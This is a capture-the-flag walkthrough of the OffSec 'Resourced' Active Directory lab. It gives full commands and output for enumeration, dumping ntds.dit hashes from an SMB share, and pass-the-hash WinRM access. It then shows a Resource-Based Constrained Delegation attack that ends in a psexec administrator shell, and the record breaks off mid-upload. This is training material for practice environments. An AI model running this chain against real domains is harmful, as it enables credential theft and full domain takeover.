# Offsec Practice: Resourced CTF Walkthrough

![Leonardo AI](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Resourced/screenshots/leonardoai.jpg)

## Introduction

The target is a Windows Active Directory Domain Controller (`resourced.local`) hosting standard AD services including LDAP, Kerberos, SMB, WinRM, and Active Directory Web Services. The system acts as the sole domain controller for the environment.

The objective of the assessment was to obtain Domain Administrator–level access by identifying and chaining misconfigurations within Active Directory, starting from unauthenticated enumeration through authenticated privilege escalation.

The attack surface consisted primarily of exposed Active Directory services over the network, SMB file shares, domain user objects, access control lists (ACLs), and delegation settings. Enumeration focused on domain user discovery, credential exposure, share permissions, and directory privileges.

The methodology followed an enumeration-driven approach using tools such as `nmap`, `rpcclient`, `crackmapexec`, `smbclient`, `impacket-secretsdump`, `evil-winrm`, `bloodhound-python`, and Impacket Kerberos utilities. Privilege escalation was achieved by abusing Active Directory ACL misconfigurations and Resource-Based Constrained Delegation (RBCD).

## Machine Enumeration

Nmap finds 13 open ports at the initial scan. Most of the ports are Active Directory generic ports, such as 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3289, and 5985.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ nmap -sC -sV 192.168.209.175 -oN nmap.init.txt                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 18:55 EDT
Nmap scan report for 192.168.209.175
Host is up (0.050s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-07 22:55:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-07T22:56:38+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-07T22:55:58+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-10-06T22:55:07
|_Not valid after:  2026-04-07T22:55:07
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-07T22:56:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.42 seconds
```

Put the all port scan and found Active Directory generic ports. Add the `resourced.local` domain into the `/etc/hosts` file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ nmap -p- 192.168.209.175 -oN nmap.all.ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 18:58 EDT
Nmap scan report for 192.168.209.175
Host is up (0.0092s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49694/tcp open  unknown
49712/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 240.74 seconds
```

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ nmap -p 9389 -sC -sV 192.168.209.175 -oN nmap.detail.tcp.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 19:05 EDT
Nmap scan report for resourced.local (192.168.209.175)
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
9389/tcp open  mc-nmf  .NET Message Framing
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

It sounds like a core active directory machine. So, start with the username enumeration using the `rpcclient` tool and find a few usernames. Put those usernames into the `usernames.txt` file. Additionally, the `V.Ventz` user’s password (`HotelCalifornia194!`) was found in the description section. Put that password into the passwords.txt.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ rpcclient -U '' -N 192.168.209.175
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant	Name: (null)	Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg	Name: (null)	Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson	Name: (null)	Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen	Name: (null)	Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone	Name: (null)	Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason	Name: (null)	Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker	Name: (null)	Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson	Name: (null)	Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson	Name: (null)	Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz	Name: (null)	Desc: New-hired, reminder: HotelCalifornia194!
```

Test `V.Ventz:HotelCalifornia194!` credential against SMB service and found few open shares.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ crackmapexec smb 192.168.209.175 -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
SMB         192.168.209.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
SMB         192.168.209.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
SMB         192.168.209.175 445    RESOURCEDC       [+] Enumerated shares
SMB         192.168.209.175 445    RESOURCEDC       Share           Permissions     Remark
SMB         192.168.209.175 445    RESOURCEDC       -----           -----------     ------
SMB         192.168.209.175 445    RESOURCEDC       ADMIN$                          Remote Admin
SMB         192.168.209.175 445    RESOURCEDC       C$                              Default share
SMB         192.168.209.175 445    RESOURCEDC       IPC$            READ            Remote IPC
SMB         192.168.209.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
SMB         192.168.209.175 445    RESOURCEDC       Password Audit  READ            
SMB         192.168.209.175 445    RESOURCEDC       SYSVOL          READ            Logon server share
```

The `Password Audit` SMB share has `ntds.dit` and `SYSTEM` files. Copy those files into the attacker system (Kali Linux).

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ smbclient \\\\192.168.152.175\\'Password Audit' -U 'V.Ventz' 
Password for [WORKGROUP\V.Ventz]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

		7706623 blocks of size 4096. 2672222 blocks available
smb: \> cd "Active Directory"
smb: \Active Directory\> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021

		7706623 blocks of size 4096. 2672222 blocks available
smb: \Active Directory\> cd ../registry
smb: \registry\> dir
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
  SYSTEM                              A 16777216  Mon Sep 27 06:45:20 2021

		7706623 blocks of size 4096. 2672222 blocks available

smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (3174.4 KiloBytes/sec) (average 3174.4 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (125.0 KiloBytes/sec) (average 3124.8 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (470.6 KiloBytes/sec) (average 3079.7 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3202.5 KiloBytes/sec) (average 3127.6 KiloBytes/sec)
```

The `impacket-secretsdump` tool helps to extract hashes from the `SYSTEM` and `ntds.dit` files. Copy all of the users’ hashes into the `hashes.txt` file and put the new usernames into the `usernames.txt` file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
Administrator:des-cbc-md5:80861f1a80f1232f
RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
krbtgt:des-cbc-md5:f1b602194f3713f8
M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
M.Mason:des-cbc-md5:268501b50e0bf47c
K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
K.Keen:des-cbc-md5:572cce13b38ce6da
L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
V.Ventz:des-cbc-md5:4af77a3d1cf7c480
S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
S.Swanson:des-cbc-md5:5d37583eae1f2f34
P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
P.Parker:des-cbc-md5:083b37079dcd764f
R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
R.Robinson:des-cbc-md5:7051d568dfd0852f
D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
D.Durant:des-cbc-md5:376119bfcea815f8
G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
G.Goldberg:des-cbc-md5:3e20fd1a25687673
[*] Cleaning up...
```

Ran the `crackmapexec` tool to brute force the `WinRM` service to find valid credentials. The `L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808` combo was found.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ crackmapexec winrm 192.168.152.175 -u usernames.txt -H hashes.txt
SMB         192.168.152.175 5985   RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
HTTP        192.168.152.175 5985   RESOURCEDC       [*] http://192.168.152.175:5985/wsman
WINRM       192.168.152.175 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.152.175 5985   RESOURCEDC       [-] resourced.local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
...
...
...
WINRM       192.168.152.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

## Initial Foothold

Try to log in with `L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808` and get the `local.txt` and flag.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ evil-winrm -i 192.168.152.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> type ../Desktop/local.txt
ad6ca0ac03a0d08bec7ea5dc91263891
```

After the initial access, the `bloodhound-python` tool helps to extract data of the active directory domain. Upload that data into the `BloodHound` tool to view the data in a graphical presentation.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ bloodhound-python -c All -u L.Livingstone --hashes 'aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808' -d 'resourced.local' -ns 192.168.152.175 --dns-tcp -v --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
DEBUG: Authentication: NT hash
DEBUG: Resolved collection methods: localadmin, session, container, psremote, objectprops, acl, group, rdp, dcom, trusts
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: resourced.local
INFO: Found AD domain: resourced.local
DEBUG: Found primary DC: resourcedc.resourced.local
DEBUG: Found Global Catalog server: resourcedc.resourced.local
DEBUG: Found KDC for enumeration domain: resourcedc.resourced.local
INFO: Getting TGT for user
DEBUG: Trying to connect to KDC at resourcedc.resourced.local:88
DEBUG: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 63, in sendReceive
    af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, port, 0, socket.SOCK_STREAM)[0]
                                         ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/socket.py", line 977, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
               ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
socket.gaierror: [Errno -2] Name or service not known

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/ad/authentication.py", line 304, in get_tgt
    tgt, cipher, _, session_key = getKerberosTGT(username, self.password, self.userdomain,
                                  ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                 unhexlify(self.lm_hash), unhexlify(self.nt_hash),
                                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                 self.aeskey,
                                                 ^^^^^^^^^^^^
                                                 self.userdomain_kdc)
                                                 ^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 190, in getKerberosTGT
    r = sendReceive(message, domain, kdcHost)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 67, in sendReceive
    raise socket.error("Connection error (%s:%s)" % (targetHost, port), e)
OSError: [Errno Connection error (resourcedc.resourced.local:88)] [Errno -2] Name or service not known

WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (resourcedc.resourced.local:88)] [Errno -2] Name or service not known
DEBUG: Using LDAP server: resourcedc.resourced.local
DEBUG: Using base DN: DC=resourced,DC=local
DEBUG: Using kerberos KDC: resourcedc.resourced.local
DEBUG: Using kerberos realm: RESOURCED.LOCAL
INFO: Connecting to LDAP server: resourcedc.resourced.local
DEBUG: Using protocol ldap
DEBUG: Authenticating to LDAP server with NTLM
DEBUG: No LAPS attributes found in schema
DEBUG: Found KeyCredentialLink attributes in schema
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
DEBUG: Writing users to file: 20251008092004_users.json
INFO: Connecting to LDAP server: resourcedc.resourced.local
DEBUG: Using protocol ldap
DEBUG: Authenticating to LDAP server with NTLM
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-512
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-526
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-527
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-519
INFO: Found 14 users
DEBUG: Finished writing users
DEBUG: Writing groups to file: 20251008092004_groups.json
DEBUG: Querying resolver LDAP for DN CN=Group Policy Creator Owners,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=Domain Admins,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=Cert Publishers,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=Enterprise Admins,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=Schema Admins,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=Domain Controllers,CN=Users,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=resourced,DC=local
DEBUG: Querying resolver LDAP for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=resourced,DC=local
INFO: Found 52 groups
DEBUG: Finished writing groups
DEBUG: Writing GPOs to file: 20251008092004_gpos.json
INFO: Found 2 gpos
DEBUG: Finished writing GPO
DEBUG: Writing OU to file: 20251008092004_ous.json
INFO: Found 1 ous
DEBUG: Finished writing OU
DEBUG: Writing containers to file: 20251008092004_containers.json
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-553
INFO: Found 19 containers
DEBUG: Finished writing containers
DEBUG: Opening file for writing: 20251008092004_domains.json
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-498
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-516
INFO: Found 0 trusts
DEBUG: Finished writing domain info
INFO: Starting computer enumeration with 10 workers
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
DEBUG: Start working
INFO: Querying computer: ResourceDC.resourced.local
DEBUG: Querying computer: ResourceDC.resourced.local
DEBUG: Resolved: 192.168.152.175
DEBUG: Trying connecting to computer: ResourceDC.resourced.local
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\srvsvc]
DEBUG: Access denied while enumerating Sessions on ResourceDC.resourced.local, likely a patched OS
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 544 SID: S-1-5-21-537427935-490066102-1511301751-500
DEBUG: Found 544 SID: S-1-5-21-537427935-490066102-1511301751-519
DEBUG: Found 544 SID: S-1-5-21-537427935-490066102-1511301751-512
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\lsarpc]
DEBUG: Resolved SID to name: ADMINISTRATOR@RESOURCED.LOCAL
DEBUG: Resolved SID to name: ENTERPRISE ADMINS@RESOURCED.LOCAL
DEBUG: Resolved SID to name: DOMAIN ADMINS@RESOURCED.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 555 SID: S-1-5-21-537427935-490066102-1511301751-500
DEBUG: Sid is cached: ADMINISTRATOR@RESOURCED.LOCAL
DEBUG: Found 555 SID: S-1-5-21-537427935-490066102-1511301751-1105
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\lsarpc]
DEBUG: Resolved SID to name: L.LIVINGSTONE@RESOURCED.LOCAL
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: DCE/RPC binding: ncacn_np:192.168.152.175[\PIPE\samr]
DEBUG: Opening domain handle
DEBUG: Found 580 SID: S-1-5-21-537427935-490066102-1511301751-1105
DEBUG: Sid is cached: L.LIVINGSTONE@RESOURCED.LOCAL
DEBUG: Querying resolver LDAP for SID S-1-5-21-537427935-490066102-1511301751-1105
DEBUG: Write worker obtained a None value, exiting
DEBUG: Write worker is done, closing files
INFO: Done in 00M 02S
INFO: Compressing output into 20251008092004_bloodhound.zip
```

## Privilege Escalation

`L.Livingstone` user has a `GenericAll` permission on the DC’s system. The `Linux Abuse` section has a privilege escalation method of `Resource-Based Constrained Delegation`

![image.png](https://raw.githubusercontent.com/het-desai/Offsec-CTF/main/Practice/Resourced/screenshots/image.png)

### Steps for Resource-Based Constrained Delegation

1. Create a new computer (`Attacker$`) in current DC (`resourced.local`) using `L.Livingstone` user credentials.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.152.175 -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -computer-name 'ATTACK$' -computer-pass 'password123'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account ATTACK$ with password password123.
```

1. Verify that computer is added using Evil-WinRM terminal.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack

DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : f008c670-98de-4869-a65d-fb85f4ceb1f7
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-4101
UserPrincipalName :
```

1. Add new delegation to newly created Machine (`Attacker$`) in current DC (`resourced.local`)

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ sudo ~/tools/windows/rbcd-attack/rbcd.py -dc-ip 192.168.152.175 -t RESOURCEDC -f 'ATTACK' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' resourced\\l.livingstone
[sudo] password for kali: 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.152.175
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

1. Verify added delegation

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity | select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
```

1. Get a Administrator account service ticket

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'password123' -impersonate Administrator -dc-ip 192.168.152.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

1. Rename the long named save ticket to short and export a KRB5CCNAME’s variable.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ mv Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache Administrator.ccache

┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ export KRB5CCNAME=./Administrator.ccache
```

1. Need to add new DNS (`resourcedc.resourced.local`) into the `/etc/hosts` file.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ cat /etc/hosts | grep "resourced"  
192.168.152.175	resourcedc.resourced.local resourced.local
```

1. Now get a Administrator shell using psexec tool.

```
┌──(kali㉿kali)-[~/offsec/Practice/Resourced]
└─$ impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.152.175
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file RwFjAYBd.exe
